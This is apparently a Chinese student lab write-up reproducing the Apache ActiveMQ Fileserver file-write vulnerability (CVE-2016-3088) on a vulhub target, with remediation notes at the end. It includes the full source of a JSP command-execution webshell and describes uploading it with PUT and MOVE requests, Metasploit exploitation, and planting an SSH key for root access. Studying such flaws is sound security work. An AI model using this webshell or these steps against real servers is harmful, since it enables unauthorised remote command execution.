# Apache ActiveMQ Fileserver远程代码执行漏洞(CVE-2016-3088)

**漏洞复现**

使用vulhub搭建环境

靶机IP：192.168.65.131:8161

本机IP:127.0.0.1

靶机IP分为8161控制端口和61616端口

本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。

漏洞源代码审计：

上传PUT执行代码：

![PUT](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\PUT.PNG)

移动MOVE执行代码：

![MOVE](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\MOVE.PNG)

删除DELETE执行代码：

![DELETE](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\DELETE.PNG)

可见该页面主要漏洞为三个执行代码均未对目的路径（Destination）进行过滤和限制

包括可无需密码访问的FileServer目录

依据以上漏洞原理可采用以下的方法进行利用

下面使用webshell的手工方法对漏洞进行利用：

1主页面登录

用户名默认为admin

密码默认为admin

![主页面](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\主页面.PNG)

提交页面：![提交页面](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\提交页面.PNG)

可通过该页面进行burpsuit的发包等命令执行操作

2使用burpsuit抓包

![抓包](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\抓包.PNG)

修改包上传webshell小马



![捕获1](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\捕获1.PNG)

因为上传动作未被任何过滤因此返回204成功状态码

接下来使用MOVE方法将webshell放在系统可执行目录下

![捕获2](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\捕获2.PNG)

MOVE动作也没有过滤函数，因此返回204成功状态码

小马含返回cmd的控制台命令

<%@ page import="java.io.*" %>
<%
try {
String cmd = request.getParameter("cmd");
Process child = Runtime.getRuntime().exec(cmd);
InputStream in = child.getInputStream();
int c;
while ((c = in.read()) != -1) {
out.print((char)c);
}
in.close();
try {
child.waitFor();
} catch (InterruptedException e) {
e.printStackTrace();
}
} catch (IOException e) {
System.err.println(e);
}
%>

直接访问小马

ls显示当前目录命令

![捕获9](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\捕获9.PNG)

id显示当前用户id组id和用户组的命令

![捕获8](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\捕获8.PNG)

root显示已经获取管理员权限

pwd显示当前目录命令![捕获10](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\捕获10.PNG)

至此使用手工webshell结束

下面是使用metapolit自动化漏洞利用工具进行渗透

1使用对应activemq扫描模块进行扫描，本机出现问题无法扫描成功

![捕获11](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\捕获11.PNG)

2使用漏洞利用模块multi/http/apache_activemq_upload_jsp进行攻击



![捕获12](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\捕获12.PNG)

显示攻击成功可以进入meterpreter

该漏洞也可以利用其可执行的目录和无过滤的命令进行SSH上传登录

首先产生SSH密钥

![ssh1](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\ssh1.PNG)

将该公钥直接上传到无保护的fileserver服务器文件夹中：

![ssh2](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\ssh2.PNG)

将该公钥移动至可执行目录下：

![ssh3](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\ssh3.PNG)

使用SSH进行登录：

![ssh4](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\ssh4.PNG)

漏洞修复：

下载源代码进行修补

先对MOVE方法进行修补



![turn](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\turn.PNG)

![turns](E:\学习\ctf\lessonnote\大作业\渗透msfconsole联合进攻\图\turns.PNG)

修复逻辑：对可执行目录进行过滤，若Destination目标地址参数含有可执行目录则返回错误消息

其他方法修复逻辑同上

ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。

通过移除 `conf\jetty.xml` 的以下配置来禁用 ActiveMQ Fileserver 功能![img](https://images.seebug.org/content/images/2017/07/--17-1.png-w331s)